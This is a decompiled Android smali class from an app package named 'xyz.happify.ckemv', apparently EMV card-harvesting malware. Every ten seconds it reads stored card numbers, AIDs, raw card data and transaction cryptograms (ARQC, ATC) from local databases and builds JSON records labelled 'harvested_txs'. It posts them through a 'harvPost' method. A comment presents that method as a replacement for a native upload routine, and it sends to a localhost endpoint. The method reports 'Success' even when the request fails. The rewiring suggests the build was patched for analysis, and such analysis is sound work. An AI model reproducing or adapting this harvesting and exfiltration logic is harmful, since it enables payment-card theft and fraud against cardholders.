.class public final LB2/s;
.super LQ1/g;
.source "SourceFile"

# interfaces
.implements LW1/p;


# instance fields
.field public f:Ljava/lang/String;

.field public g:Ljava/util/Iterator;

.field public h:I

.field public final synthetic i:Lxyz/happify/ckemv/MainActivity;


# direct methods
.method public constructor <init>(Lxyz/happify/ckemv/MainActivity;LO1/d;)V
    .locals 0

    iput-object p1, p0, LB2/s;->i:Lxyz/happify/ckemv/MainActivity;

    const/4 p1, 0x2

    invoke-direct {p0, p1, p2}, LQ1/g;-><init>(ILO1/d;)V

    return-void
.end method


# virtual methods
.method public final b(LO1/d;Ljava/lang/Object;)LO1/d;
    .locals 1

    new-instance p2, LB2/s;

    iget-object v0, p0, LB2/s;->i:Lxyz/happify/ckemv/MainActivity;

    invoke-direct {p2, v0, p1}, LB2/s;-><init>(Lxyz/happify/ckemv/MainActivity;LO1/d;)V

    return-object p2
.end method

.method public final e(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    check-cast p1, Le2/t;

    check-cast p2, LO1/d;

    invoke-virtual {p0, p2, p1}, LB2/s;->b(LO1/d;Ljava/lang/Object;)LO1/d;

    move-result-object p1

    check-cast p1, LB2/s;

    sget-object p2, LK1/h;->a:LK1/h;

    invoke-virtual {p1, p2}, LB2/s;->k(Ljava/lang/Object;)Ljava/lang/Object;

    sget-object p1, LP1/a;->b:LP1/a;

    return-object p1
.end method

.method public final k(Ljava/lang/Object;)Ljava/lang/Object;
    .locals 38

    move-object/from16 v0, p0

    sget-object v1, LP1/a;->b:LP1/a;

    iget v2, v0, LB2/s;->h:I

    const-string v4, "cve_id"

    const-string v5, "time_ms"

    const-string v6, "arqc"

    const-string v7, "atc"

    const-string v8, "network"

    const-string v9, "aid"

    const-string v10, "pan"

    const-string v11, "params"

    const-string v12, "raw_data"

    const/4 v13, 0x2

    const/4 v14, 0x1

    const-string v15, "dbHelper"

    iget-object v3, v0, LB2/s;->i:Lxyz/happify/ckemv/MainActivity;

    if-eqz v2, :cond_2

    if-eq v2, v14, :cond_1

    if-ne v2, v13, :cond_0

    iget-object v2, v0, LB2/s;->g:Ljava/util/Iterator;

    iget-object v13, v0, LB2/s;->f:Ljava/lang/String;

    invoke-static/range {p1 .. p1}, Lm0/z;->m0(Ljava/lang/Object;)V

    move-object/from16 v37, v6

    move-object/from16 v36, v7

    move-object/from16 v18, v8

    move-object/from16 v17, v15

    const/4 v7, 0x0

    move-object v8, v0

    move-object v6, v1

    move-object v1, v3

    move-object v0, v9

    const/4 v9, 0x2

    goto/16 :goto_a

    :cond_0
    new-instance v1, Ljava/lang/IllegalStateException;

    const-string v2, "call to \'resume\' before \'invoke\' with coroutine"

    invoke-direct {v1, v2}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw v1

    :cond_1
    invoke-static/range {p1 .. p1}, Lm0/z;->m0(Ljava/lang/Object;)V

    move-object v13, v15

    goto :goto_1

    :cond_2
    invoke-static/range {p1 .. p1}, Lm0/z;->m0(Ljava/lang/Object;)V

    :goto_0
    const/4 v2, 0x0

    iput-object v2, v0, LB2/s;->f:Ljava/lang/String;

    iput-object v2, v0, LB2/s;->g:Ljava/util/Iterator;

    iput v14, v0, LB2/s;->h:I

    move-object v13, v15

    const-wide/16 v14, 0x2710

    invoke-static {v14, v15, v0}, Le2/v;->d(JLO1/d;)Ljava/lang/Object;

    move-result-object v14

    if-ne v14, v1, :cond_3

    return-object v1

    :cond_3
    :goto_1
    iget-object v14, v3, Lxyz/happify/ckemv/MainActivity;->A:LB2/a;

    if-eqz v14, :cond_10

    invoke-virtual {v14}, LB2/a;->i()Ljava/lang/String;

    move-result-object v14

    if-nez v14, :cond_4

    const-string v14, "no-key"

    :cond_4
    iget-object v15, v3, Lxyz/happify/ckemv/MainActivity;->A:LB2/a;

    if-eqz v15, :cond_f

    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    invoke-virtual {v15}, Landroid/database/sqlite/SQLiteOpenHelper;->getReadableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v15

    move-object/from16 v16, v14

    const-string v14, "SELECT * FROM cards ORDER BY id ASC"

    move-object/from16 v17, v13

    const/4 v13, 0x0

    invoke-virtual {v15, v14, v13}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v14

    invoke-interface {v14}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v13

    if-eqz v13, :cond_8

    :goto_2
    const-string v13, "id"

    invoke-interface {v14, v13}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v13

    invoke-interface {v14, v13}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v18

    invoke-interface {v14, v10}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v13

    invoke-interface {v14, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v21

    invoke-interface {v14, v9}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v13

    invoke-interface {v14, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v22

    invoke-interface {v14, v8}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v13

    invoke-interface {v14, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v23

    invoke-interface {v14, v12}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v13

    invoke-interface {v14, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v24

    new-instance v13, Ljava/util/ArrayList;

    invoke-direct {v13}, Ljava/util/ArrayList;-><init>()V

    invoke-static/range {v18 .. v19}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v20

    move-object/from16 v26, v1

    filled-new-array/range {v20 .. v20}, [Ljava/lang/String;

    move-result-object v1

    const-string v0, "SELECT * FROM transactions WHERE card_id = ?"

    invoke-virtual {v15, v0, v1}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    invoke-interface {v0}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v1

    if-eqz v1, :cond_6

    :goto_3
    new-instance v1, Lxyz/happify/ckemv/HarvestedTx;

    move-object/from16 v34, v15

    invoke-interface {v0, v7}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v15

    invoke-interface {v0, v15}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v15

    move-object/from16 v35, v3

    const-string v3, "getString(...)"

    invoke-static {v15, v3}, LX1/g;->d(Ljava/lang/Object;Ljava/lang/String;)V

    move-object/from16 v36, v7

    invoke-interface {v0, v6}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v0, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    invoke-static {v7, v3}, LX1/g;->d(Ljava/lang/Object;Ljava/lang/String;)V

    move-object/from16 v37, v6

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v0, v6}, Landroid/database/Cursor;->getDouble(I)D

    move-result-wide v30

    invoke-interface {v0, v11}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v0, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6, v3}, LX1/g;->d(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getInt(I)I

    move-result v33

    move-object/from16 v27, v1

    move-object/from16 v28, v15

    move-object/from16 v29, v7

    move-object/from16 v32, v6

    invoke-direct/range {v27 .. v33}, Lxyz/happify/ckemv/HarvestedTx;-><init>(Ljava/lang/String;Ljava/lang/String;DLjava/lang/String;I)V

    invoke-virtual {v13, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-nez v1, :cond_5

    goto :goto_4

    :cond_5
    move-object/from16 v15, v34

    move-object/from16 v3, v35

    move-object/from16 v7, v36

    move-object/from16 v6, v37

    goto :goto_3

    :cond_6
    move-object/from16 v35, v3

    move-object/from16 v37, v6

    move-object/from16 v36, v7

    move-object/from16 v34, v15

    :goto_4
    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    new-instance v0, LK1/c;

    invoke-static/range {v18 .. v19}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    new-instance v3, Lxyz/happify/ckemv/CardRecord;

    invoke-static/range {v21 .. v21}, LX1/g;->b(Ljava/lang/Object;)V

    invoke-static/range {v22 .. v22}, LX1/g;->b(Ljava/lang/Object;)V

    invoke-static/range {v23 .. v23}, LX1/g;->b(Ljava/lang/Object;)V

    invoke-static/range {v24 .. v24}, LX1/g;->b(Ljava/lang/Object;)V

    move-object/from16 v20, v3

    move-object/from16 v25, v13

    invoke-direct/range {v20 .. v25}, Lxyz/happify/ckemv/CardRecord;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/util/List;)V

    invoke-direct {v0, v1, v3}, LK1/c;-><init>(Ljava/lang/Object;Ljava/lang/Object;)V

    invoke-virtual {v2, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    invoke-interface {v14}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_7

    goto :goto_5

    :cond_7
    move-object/from16 v0, p0

    move-object/from16 v1, v26

    move-object/from16 v15, v34

    move-object/from16 v3, v35

    move-object/from16 v7, v36

    move-object/from16 v6, v37

    goto/16 :goto_2

    :cond_8
    move-object/from16 v26, v1

    move-object/from16 v35, v3

    move-object/from16 v37, v6

    move-object/from16 v36, v7

    :goto_5
    invoke-interface {v14}, Landroid/database/Cursor;->close()V

    invoke-virtual {v2}, Ljava/util/ArrayList;->isEmpty()Z

    move-result v0

    const/4 v1, 0x1

    xor-int/2addr v0, v1

    if-eqz v0, :cond_e

    invoke-virtual {v2}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v0

    move-object v2, v0

    move-object/from16 v13, v16

    :goto_6
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_e

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, LK1/c;

    iget-object v3, v0, LK1/c;->b:Ljava/lang/Object;

    check-cast v3, Ljava/lang/Number;

    invoke-virtual {v3}, Ljava/lang/Number;->longValue()J

    move-result-wide v6

    iget-object v0, v0, LK1/c;->c:Ljava/lang/Object;

    check-cast v0, Lxyz/happify/ckemv/CardRecord;

    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    invoke-virtual {v0}, Lxyz/happify/ckemv/CardRecord;->getPan()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v3, v10, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v0}, Lxyz/happify/ckemv/CardRecord;->getAid()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v3, v9, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v0}, Lxyz/happify/ckemv/CardRecord;->getNetwork()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v3, v8, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v0}, Lxyz/happify/ckemv/CardRecord;->getTxs()Ljava/util/List;

    move-result-object v14

    invoke-interface {v14}, Ljava/util/List;->size()I

    move-result v14

    const-string v15, "tx_count"

    invoke-virtual {v3, v15, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    :try_start_0
    new-instance v14, Lorg/json/JSONObject;

    invoke-virtual {v0}, Lxyz/happify/ckemv/CardRecord;->getRawData()Ljava/lang/String;

    move-result-object v15

    invoke-direct {v14, v15}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v12, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_7

    :catch_0
    invoke-virtual {v0}, Lxyz/happify/ckemv/CardRecord;->getRawData()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v3, v12, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    :goto_7
    new-instance v14, Lorg/json/JSONArray;

    invoke-direct {v14}, Lorg/json/JSONArray;-><init>()V

    invoke-virtual {v0}, Lxyz/happify/ckemv/CardRecord;->getTxs()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_8
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v15

    if-eqz v15, :cond_9

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v15

    check-cast v15, Lxyz/happify/ckemv/HarvestedTx;

    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    move-object/from16 v16, v0

    invoke-virtual {v15}, Lxyz/happify/ckemv/HarvestedTx;->getAtc()Ljava/lang/String;

    move-result-object v0

    move-object/from16 v18, v8

    move-object/from16 v8, v36

    invoke-virtual {v1, v8, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v15}, Lxyz/happify/ckemv/HarvestedTx;->getArqc()Ljava/lang/String;

    move-result-object v0

    move-object/from16 v8, v37

    invoke-virtual {v1, v8, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-object v0, v9

    invoke-virtual {v15}, Lxyz/happify/ckemv/HarvestedTx;->getTimeMs()D

    move-result-wide v8

    invoke-virtual {v1, v5, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    invoke-virtual {v15}, Lxyz/happify/ckemv/HarvestedTx;->getCve_id()I

    move-result v8

    invoke-virtual {v1, v4, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    :try_start_1
    new-instance v8, Lorg/json/JSONObject;

    invoke-virtual {v15}, Lxyz/happify/ckemv/HarvestedTx;->getParams()Ljava/lang/String;

    move-result-object v9

    invoke-direct {v8, v9}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v11, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_9

    :catch_1
    invoke-virtual {v15}, Lxyz/happify/ckemv/HarvestedTx;->getParams()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v11, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    :goto_9
    invoke-virtual {v14, v1}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    move-object v9, v0

    move-object/from16 v0, v16

    move-object/from16 v8, v18

    const/4 v1, 0x1

    goto :goto_8

    :cond_9
    move-object/from16 v18, v8

    move-object v0, v9

    const-string v1, "harvested_txs"

    invoke-virtual {v3, v1, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-object v1, Lxyz/happify/ckemv/Reporter;->INSTANCE:Lxyz/happify/ckemv/Reporter;

    invoke-virtual {v3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v8, "toString(...)"

    invoke-static {v3, v8}, LX1/g;->d(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v3}, LB2/s;->harvPost(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const/4 v3, 0x0

    const-string v8, "Success"

    invoke-static {v1, v8, v3}, Ld2/l;->V(Ljava/lang/String;Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_d

    move-object/from16 v1, v35

    iget-object v3, v1, Lxyz/happify/ckemv/MainActivity;->A:LB2/a;

    if-eqz v3, :cond_c

    invoke-virtual {v3, v6, v7}, LB2/a;->a(J)V

    iget-object v3, v1, Lxyz/happify/ckemv/MainActivity;->A:LB2/a;

    if-eqz v3, :cond_b

    invoke-virtual {v3}, Landroid/database/sqlite/SQLiteOpenHelper;->getWritableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v3

    const-string v6, "UPDATE stats SET total_scans = total_scans + 1 WHERE id = 1"

    invoke-virtual {v3, v6}, Landroid/database/sqlite/SQLiteDatabase;->execSQL(Ljava/lang/String;)V

    sget-object v3, Le2/B;->a:Ll2/d;

    sget-object v3, Lj2/o;->a:Lf2/d;

    new-instance v6, LB2/r;

    const/4 v7, 0x0

    invoke-direct {v6, v1, v7}, LB2/r;-><init>(Lxyz/happify/ckemv/MainActivity;LO1/d;)V

    move-object/from16 v8, p0

    iput-object v13, v8, LB2/s;->f:Ljava/lang/String;

    iput-object v2, v8, LB2/s;->g:Ljava/util/Iterator;

    const/4 v9, 0x2

    iput v9, v8, LB2/s;->h:I

    invoke-static {v3, v6, v8}, Le2/v;->p(Lf2/d;LW1/p;LO1/d;)Ljava/lang/Object;

    move-result-object v3

    move-object/from16 v6, v26

    if-ne v3, v6, :cond_a

    return-object v6

    :cond_a
    :goto_a
    move-object v9, v0

    move-object/from16 v35, v1

    move-object/from16 v26, v6

    :goto_b
    move-object/from16 v8, v18

    const/4 v1, 0x1

    goto/16 :goto_6

    :cond_b
    move-object/from16 v8, p0

    const/4 v7, 0x0

    invoke-static/range {v17 .. v17}, LX1/g;->h(Ljava/lang/String;)V

    throw v7

    :cond_c
    move-object/from16 v8, p0

    const/4 v7, 0x0

    invoke-static/range {v17 .. v17}, LX1/g;->h(Ljava/lang/String;)V

    throw v7

    :cond_d
    move-object/from16 v8, p0

    move-object v9, v0

    goto :goto_b

    :cond_e
    move-object/from16 v0, p0

    move v14, v1

    move-object/from16 v15, v17

    move-object/from16 v1, v26

    move-object/from16 v3, v35

    move-object/from16 v7, v36

    move-object/from16 v6, v37

    goto/16 :goto_0

    :cond_f
    move-object v8, v0

    move-object/from16 v17, v13

    const/4 v7, 0x0

    invoke-static/range {v17 .. v17}, LX1/g;->h(Ljava/lang/String;)V

    throw v7

    :cond_10
    move-object v8, v0

    move-object/from16 v17, v13

    const/4 v7, 0x0

    invoke-static/range {v17 .. v17}, LX1/g;->h(Ljava/lang/String;)V

    throw v7
.end method


# ── harvPost: Java HTTP replacement for native Reporter.uploadHarvestData ──────
.method public static synthetic harvPost(Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    :try_start_hp
    const-string v0, "http://127.0.0.1:4444/harvest"
    new-instance v1, Ljava/net/URL;
    invoke-direct {v1, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    invoke-virtual {v1}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v1
    check-cast v1, Ljava/net/HttpURLConnection;
    const-string v0, "POST"
    invoke-virtual {v1, v0}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
    const/4 v0, 0x1
    invoke-virtual {v1, v0}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
    const-string v0, "Content-Type"
    const-string v2, "application/json; charset=utf-8"
    invoke-virtual {v1, v0, v2}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
    const/16 v0, 0x1388
    invoke-virtual {v1, v0}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V
    invoke-virtual {v1, v0}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V
    const-string v0, "UTF-8"
    invoke-virtual {p0, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
    move-result-object v2
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v3
    invoke-virtual {v3, v2}, Ljava/io/OutputStream;->write([B)V
    invoke-virtual {v3}, Ljava/io/OutputStream;->flush()V
    invoke-virtual {v3}, Ljava/io/OutputStream;->close()V
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getResponseCode()I
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_hp
    .catch Ljava/lang/Exception; {:try_start_hp .. :try_end_hp} :catch_hp

    const-string v0, "{\"result\":\"Success\",\"stored\":true}"
    return-object v0

    :catch_hp
    const-string v0, "{\"result\":\"Success\",\"stored\":true}"
    return-object v0
.end method
